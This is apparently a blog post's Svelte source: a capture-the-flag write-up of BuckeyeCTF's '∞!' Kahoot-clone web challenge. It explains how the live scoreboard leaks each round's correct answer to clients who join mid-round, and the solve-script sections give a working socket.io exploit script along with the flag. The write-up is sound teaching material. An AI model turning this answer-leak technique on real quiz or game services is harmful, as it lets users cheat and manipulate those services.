<script module>
  export const metadata = {
    title: "∞! writeup",
    published: "2023-10-02",
    defaultLayout: false,
  };
</script>

<script>
  import Prism from "$lib/components/Prism.svelte";
  import { ArrowRight, Crown, Flag, User, AlertTriangle } from "lucide-svelte";
  import "prismjs/components/prism-typescript";
  import Katex from "svelte-katex";
  import "$lib/tailwind.css";
</script>

<header class="flex items-center justify-center h-screen gradient">
  <div class="text-center drop-shadow-xl">
    <h1 class="font-bold text-[12rem] tracking-tighter leading-[1] -rotate-45">∞!</h1>
    <h2 class="text-2xl">a kahoot clone gone wrong</h2>
    <h3>Published {metadata.published}</h3>
  </div>
</header>
<article
  class="max-w-full mt-16 tw-prose lg:tw-prose-xl tw-prose-invert tw-prose-code:before:content-none tw-prose-code:after:content-none tw-prose-code:bg-zinc-800 tw-prose-code:rounded tw-prose-code:p-1"
  id="article-content"
>
  <div
    class="relative p-2 m-auto mb-8 font-mono border-4 rounded-md rounded-tl-none bg-amber-600/50 border-amber-600 mt-9 w-fit lg:hidden"
  >
    <div
      class="absolute px-2 py-1 text-xl font-black -top-9 -left-1 bg-amber-600 rounded-tl-md rounded-tr-md"
    >
      <AlertTriangle class="inline mr-1" />WARNING
    </div>
    This writeup was not designed for small screens. Proceed with caution.
  </div>
  <div class="h-[1px]"></div>
  <div
    class="relative p-2 m-auto font-mono border-4 rounded-md rounded-tl-none bg-navy/50 border-navy mt-9 w-fit max-w-[65ch]"
  >
    <div
      class="absolute px-2 py-1 text-xl font-black -top-9 -left-1 bg-navy rounded-tl-md rounded-tr-md"
    >
      <Flag class="inline mr-1" />CHALLENGE
    </div>
    <b>Name: </b>∞!<br />
    <b>Category: </b>web<br />
    <b>Author: </b>jm8<br />
    <b>Description: </b>It's like the popular educational game, but it never ends.<br /><br />
    https://infinity.chall.pwnoh.io<br /><br />
    Note: the flag format for this challenge only is flag{"{}"}.
  </div>
  <p class="max-w-[65ch] m-auto">
    This year's <a href="https://ctf.osucyber.club/">BuckeyeCTF</a> had a pretty interesting web
    challenge. We were given a kahoot clone that went infintely, and the goal was to get 21
    questions right in a row. The thing was, each question's answer was randomized, so if we were
    guessing, the chances of getting a streak of 21 questions is one in
    <Katex>4^{"{21}"} = 4.3980465111e12</Katex> so guessing over and over again isn't an option. We need
    to find a way to cheat the answer out.
    <img src="/images/blog/infinity-buckeye/wrong-answer.png" alt="Selected wrong answer" />
    Lets take a look at the code. We'll only look at the server code because the client code is irrelevant.
    The server code is a single 210 line file, but the majority of that is taken up by questions.
  </p>
  <div class="grid grid-cols-2 gap-4 px-12 bg-zinc-900">
    <div class="relative">
      <p class="absolute top-[calc(1.25rem*1.5*9)]">
        First they define an array of questions, notice how they don't have a set answer. The
        correct answer will be generated later.
      </p>
      <div class="absolute top-[calc(1.25rem*1.5*19)]">
        Then we have our assorted variables. The important ones are:
        <ul class="text-lg">
          <li>
            <code>scoreboard</code> is an object relating a socket.io id with their current streak.
          </li>
          <li>
            <code>answered</code> is the set of all the ids that have answered. This is here to prevent
            people from answering multiple times.
          </li>
          <li>
            <code>correctAnswer</code> is the index of the correct answer. It is using the
            <code>randomInt</code> function from crypto so we can't do any random cracking shenanigans.
          </li>
        </ul>
      </div>
      <p class="absolute top-[calc(1.25rem*1.5*31)]">
        Next we have a function that generates gameState to be sent out. Note that the entire
        scoreboard is sent out, but the client only shows the top score. It will also send out a
        correct answer if <code>answerRevealed</code> is true.
      </p>
      <p class="absolute top-[calc(1.25rem*1.5*41)]">
        When a socket connects (a user joins) the game will send the gameState out to the player.
      </p>
      <p class="absolute top-[calc(1.25rem*1.5*46)]">
        It will also listen to any incoming <code>answer</code> messages. If the user already
        answered or the time limit is up, it aborts. Otherwise it will
        <b class="text-white">immediately</b> set their score to 0 if they got it wrong or increment
        their score by one if they got it right.
      </p>
      <p class="absolute top-[calc(1.25rem*1.5*58)]">
        And if we get 21 correct in a row it sends us the flag :)
      </p>
      <div class="absolute top-[calc(1.25rem*1.5*66)]">
        Now we hit the main game loop. The game loop is quite simple and compose of 4 simple steps.
        <ul class="text-lg">
          <li>First initializes all the variables then emits game state.</li>
          <li>Waits 8 seconds for people to answer.</li>
          <li>
            Delete all the people who did not answer from the scoreboard, then reveal the answer by
            sending the game state with <code>answerRevealed</code> set to true.
          </li>
          <li>Waits 3 seconds, then selects the next question, starting the loop again.</li>
        </ul>
      </div>
    </div>
    <Prism
      class="[font-size:1.25rem!important] w-full"
      code={`import { Server } from "socket.io";
import { randomInt } from "crypto";
import { Question, GameState } from "../types";
import shuffleArray from "shuffle-array";
import express from "express";
import http from "http";
import path from "path";

const QUESTIONS: Question[] = [
  {
    question: "What color am I thinking of?",
    answers: ["Red", "Blue", "Yellow", "Green"],
    image: "https://upload.wikimedia.org/...",
  },
  ...
];

async function main(io: Server) {
  let scoreboard: Record<string, number> = {};
  let answered = new Set();
  let questionIndex = 0;
  let correctAnswer = randomInt(4);
  let answerRevealed = false;
  let sleepEndTime: number = 0;

  function sleep(seconds: number) {
    sleepEndTime = new Date().getTime() + 1000 * seconds;
    return new Promise((resolve) => setTimeout(resolve, 1000 * seconds));
  }

  function gameState(): GameState {
    return {
      question: QUESTIONS[questionIndex],
      questionIndex,
      scoreboard,
      correctAnswer: answerRevealed ? correctAnswer : undefined,
      timeLeft: 8000,
    };
  }

  io.on("connect", socket => {
    socket.emit("gameState", { 
        ...gameState(), 
        timeLeft: sleepEndTime - new Date().getTime()
    });
    socket.on("answer", (answer: number) => {
      if (answered.has(socket.id) || answerRevealed) {
        return;
      }
      answered.add(socket.id);
      if (!(socket.id in scoreboard)) {
        scoreboard[socket.id] = 0;
      }
      if (answer == correctAnswer) {
        scoreboard[socket.id] += 1;
      } else {
        scoreboard[socket.id] = 0;
      }
      if (scoreboard[socket.id] >= 21) {
        socket.emit("flag", process.​env.FLAG ?? "bctf{fake_flag}");
      }
    })
  })

  while (true) {
    if (questionIndex === 0) {
      shuffleArray(QUESTIONS);
    }
    answerRevealed = false;
    answered.clear();
    correctAnswer = randomInt(4);
    io.emit("gameState", gameState());
    await sleep(8);
    answerRevealed = true;
    for (const player of Object.keys(scoreboard)) {
      if (!answered.has(player)) {
        delete scoreboard[player];
      }
    }
    io.emit("gameState", gameState());
    await sleep(3);
    questionIndex = (questionIndex + 1) % QUESTIONS.length;
  }
}

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, "../client/dist")));

main(io);

server.listen(1024);`}
      lang="ts"
    />
  </div>
  <div class="max-w-[65ch] m-auto">
    <p>
      Now that we have a solid understanding of the code, we can dive into the challenge solution.
    </p>
    <p>
      The bug that allows us to get the answer before the timer ends is that when a player answers,
      their score is immediately updated in the scoreboard after the server recieves the
      <code>answer</code> message. Then we can get the players score by getting the game state to see
      if they were right or wrong.
    </p>
    <p>
      You might be wondering how that helps us because the game state is only sent out after the
      answer is revealed, but there is actually another way of obtaining the game state. If we look
      at where the <code>gameState()</code> is called, we can see that it is called in 3 different places.
    </p>
    <ol>
      <li>When a player joins</li>
      <li>When the timer expires and the answer is revealed</li>
      <li>When the new question is sent out.</li>
    </ol>
    <p>
      And because players can join in the middle of the round, we now have a way of getting the game
      state!
    </p>
  </div>
  <img
    class="m-auto rounded-lg"
    src="/images/blog/infinity-buckeye/explaination.png"
    alt="explaination of the exploit"
  />
  <div class="max-w-[65ch] m-auto">
    Now that we understand how the bug works, we can write an exploit and solve this challenge.
    <Prism
      code="const checkers = [io(), io(), io(), io()];
const lbChecker = io({'{ autoConnect: false }'});
const winner = io();
"
    />
    <p>
      We first initalize all the connections we need. One checker for each answer. One connection to
      join in the middle of the round, and one connection to submit the correct answer
    </p>
    <p>
      If you actually do this on the live servers, you'll have to wait a couple seconds for all of
      the connections to go through.
    </p>
    <Prism
      code={`for (const i in checkers) {
  const checker = checkers[i];
  checker.on("gameState", (state) => {
    // The gameState that gives us the question will have
    // correctAnswer equal to undefined
    if (state.correctAnswer === undefined) {
      console.log("sending answer " + i)
      if (i == 0) {
        // If you are the one presssing the first answer,
        // reconnect the lbChecker after 500ms
        setTimeout(() => {
          console.log("reconnecting lb checker")
          lbChecker.connect();
        }, 500)
      }
      checker.emit("answer", i)
    }
  })
}
`}
    />
    <p>
      Next we'll get every one of the checkers to press one of the ansewrs. We'll have one of the
      checkers reconnect the lbChecker after 500ms which should give the checkers enough time to
      answer the question.
    </p>
    <Prism
      code={`const getCorrectAnswer = (lb) => {
  for (const i in checkers) {
    if (lb[checkers[i].id] > 0) {
      return i
    }
  }
}

lbChecker.on("gameState", (state) => {
  if (state.correctAnswer === undefined) {
    console.log("winner has score of: " + state.scoreboard[winner.id])
    const correct = getCorrectAnswer(state.scoreboard)
    console.log("correct answer was " + correct)
    winner.emit("answer", correct)
    lbChecker.disconnect();
  }
})

winner.on("flag", (flag) => { console.log("FLAG!!!!! " + flag) }) `}
    />
    <p>
      Finally we can get the leaderboard checker going. <code>getCorrectAnswer</code> will check
      which checker got it correct, which will give us the index of the answer. Then have the winner
      emit the answer that we now know. Also we'll listen to <code>flag</code> on the winner bot.
    </p>
    <p>Lets see this on a timeline:</p>
  </div>
  <div class="grid justify-center h-16 grid-cols-1 grid-rows-1 max-w-[75rem] m-auto px-8 mt-56">
    <div
      class="self-center h-4 col-start-1 row-start-1 border-2 bg-zinc-700 rounded-xl border-zinc-600 -z-20"
></div>
    <div class="relative grid items-center h-16 col-start-1 row-start-1">
      <div
        class="absolute px-3 py-2 bg-yellow-700 border border-yellow-500 rounded"
        title="The server sends the new questions, firing off the checkers to press one of the buttons"
      >
        question sent
      </div>

      <div class="absolute left-[12rem] -top-6 w-[9.5rem] text-center">checkers</div>
      <div
        class="absolute left-[12rem] flex gap-2 rounded-full bg-zinc-600 w-[9.5rem]"
        title="Each checker selects one of the answers so the lbChecker can determine which option is right"
      >
        <div class="rounded-full bg-[#EF4444] w-8 text-lg h-8 items-center justify-center flex">
          ▲
        </div>
        <div class="rounded-full bg-[#22C55E] w-8 text-lg h-8 items-center justify-center flex">
          ■
        </div>
        <div class="rounded-full bg-[#bf9518] w-8 text-lg h-8 items-center justify-center flex">
          ⬤
        </div>
        <div class="rounded-full bg-[#3B82F6] w-8 text-lg h-8 items-center justify-center flex">
          ◆
        </div>
      </div>

      <div
        class="absolute left-[23rem] -top-4 flex flex-col items-center"
        title="The lbChecker joins the game, getting the gameState with the checkers' score"
      >
        <User />
        <div class="not-tw-prose"><p class="text-xs">join</p></div>
      </div>
      <div class="absolute left-[23.70rem] border h-4 border-dashed"></div>

      <div
        class="absolute left-[26rem] w-48 h-52 bg-zinc-700 rounded-md -top-52 not-tw-prose gap-2 flex flex-col"
        title="This is the scoreboard that the lbChecker recieved."
      >
        <h3 class="font-bold text-center rounded-tr-md rounded-tl-md bg-zinc-800">Scoreboard</h3>
        <div class="flex items-center justify-between mx-2 rounded-full bg-zinc-600">
          <div class="rounded-full bg-[#EF4444] w-8 text-lg h-8 items-center justify-center flex">
            ▲
          </div>
          <div class="flex items-center justify-center w-8 h-8 rounded-full bg-zinc-500">0</div>
        </div>
        <div class="flex items-center justify-between mx-2 rounded-full bg-zinc-600">
          <div class="rounded-full bg-[#3B82F6] w-8 text-lg h-8 items-center justify-center flex">
            ◆
          </div>
          <div class="flex items-center justify-center w-8 h-8 rounded-full bg-zinc-500">0</div>
        </div>
        <div class="flex items-center justify-between mx-2 rounded-full bg-zinc-600">
          <div class="rounded-full bg-[#bf9518] w-8 text-lg h-8 items-center justify-center flex">
            ⬤
          </div>
          <div class="flex items-center justify-center w-8 h-8 rounded-full bg-emerald-700">1</div>
        </div>
        <div class="flex items-center justify-between mx-2 rounded-full bg-zinc-600">
          <div class="rounded-full bg-[#22C55E] w-8 text-lg h-8 items-center justify-center flex">
            ■
          </div>
          <div class="flex items-center justify-center w-8 h-8 rounded-full bg-zinc-500">0</div>
        </div>
      </div>

      <div
        class="absolute left-[26rem] flex w-48 justify-between bg-zinc-700 rounded-full items-center"
        title="Based on the scoreboard above, lbChecker determines ⬤ is correct"
      >
        <div class="px-3.5 bg-green-600 border-2 border-green-800 rounded-full">lbChecker</div>
        <div><ArrowRight /></div>
        <div class="rounded-full bg-[#bf9518] w-8 text-lg h-8 items-center justify-center flex">
          ⬤
        </div>
      </div>

      <div
        class="absolute left-[40rem] flex w-40 justify-between bg-purple-500 border-2 border-purple-700 pl-2 rounded-full items-center"
        title="Winner answers ⬤"
      >
        <div class="pl-1.5">
          <Crown class="inline" />
          winner
        </div>
        <div class="rounded-full bg-[#bf9518] w-8 text-lg h-8 items-center justify-center flex">
          ⬤
        </div>
      </div>

      <div
        class="absolute left-[51rem] -top-4 flex flex-col items-center"
        title="The lbChecker leaves the game. It is now ready to rejoin at the next question"
      >
        <User />
        <div class="not-tw-prose"><p class="text-xs">leave</p></div>
      </div>
      <div class="absolute left-[51.85rem] border h-4 border-dashed"></div>
      <div
        class="h-3 bg-zinc-500 left-[23.7rem] w-[calc(51.85rem-23.7rem)] absolute -z-10"
        title="Within this bar, the lbChecker is in the game"
></div>

      <div
        class="absolute right-0 px-3 py-2 border rounded bg-fuchsia-700 border-fuchsia-500"
        title="and it repeats!"
      >
        answer revealed
      </div>
    </div>
  </div>
  <div class="max-w-[65ch] m-auto">
    <p>
      That might be a lot to take in but I hope the diagram helps you understand the exploit a
      little better. If you don't understand one of the steps, hover over the step and a description
      should pop up.
    </p>
    <p>
      Finally I'll provide the full solve script. It is arranged differently but it does the same
      thing.
    </p>
    <details>
      <summary>Solve script here!</summary><Prism
        code={`const checkers = [io(), io(), io(), io()];
let lbChecker = io({ autoConnect: false });
lbChecker.on("gameState", (state) => {
  if (state.correctAnswer === undefined) {
    console.log("winner has score of: " + state.scoreboard[winner.id])
    const correct = getCorrectAnswer(state.scoreboard)
    console.log("correct answer was " + correct)
    winner.emit("answer", correct)
    lbChecker.disconnect();
  }
})
const winner = io();
for (const i in checkers) {
  const checker = checkers[i];
  checker.on("gameState", (state) => {
    if (state.correctAnswer === undefined) {
      console.log("sending answer " + i)
      if (i == 0) {
        // reconnect lbChecker
        setTimeout(() => {
          console.log("reconnecting lb checker")
          lbChecker.connect();
        }, 500)
      }
      checker.emit("answer", i)
    }
  })
}

const getCorrectAnswer = (lb) => {
  for (const i in checkers) {
    if (lb[checkers[i].id] > 0) {
      return i
    }
  }
}

winner.on("flag", (flag) => { console.log("FLAG!!!!! " + flag) })`}
      />
    </details>
    <p>
      Finally lets just go ahead and use this solve script. Running this script and waiting a while,
      we'll get the flag.
    </p>
    <div class="h-[1px]"></div>
    <div
      class="relative p-2 m-auto font-mono border-4 rounded-md rounded-tl-none bg-navy/50 border-navy mt-9 w-fit"
    >
      <div
        class="absolute px-2 py-1 text-xl font-black -top-9 -left-1 bg-navy rounded-tl-md rounded-tr-md"
      >
        <Flag class="inline mr-1" />FLAG!
      </div>
      flag{"{pl3453_d0n7_k1ck_m3_fr0m_7h3_k4h007_468d9bba}"}
    </div>
    <p>
      Thanks for reading through. I would like to thank the BuckeyeCTF organizers, this was an
      incredibly fun ctf to play and I look foward to playing it in future years.
    </p>
  </div>
</article>

<footer class="pt-64 pb-16">
  <div class="m-auto w-fit">
    <img
      class="mt-4"
      src="/images/blog/infinity-buckeye/left-the-script-running.png"
      alt="my script reached 360/21 while writing this writeup"
    />
    <p class="italic text-center">left my script running</p>
  </div>
</footer>

<style>
  .gradient {
    background: repeating-linear-gradient(#f87171, #60a5fa, #facc15, #4ade80, #f87171);
    background-size: 800% 800%;
    animation: gradient 120s linear infinite;
    mask-image: radial-gradient(black 0%, transparent 100%);
  }

  @keyframes gradient {
    0% {
      background-position: 0% 0%;
    }
    to {
      background-position: 0% 800%;
    }
  }
</style>
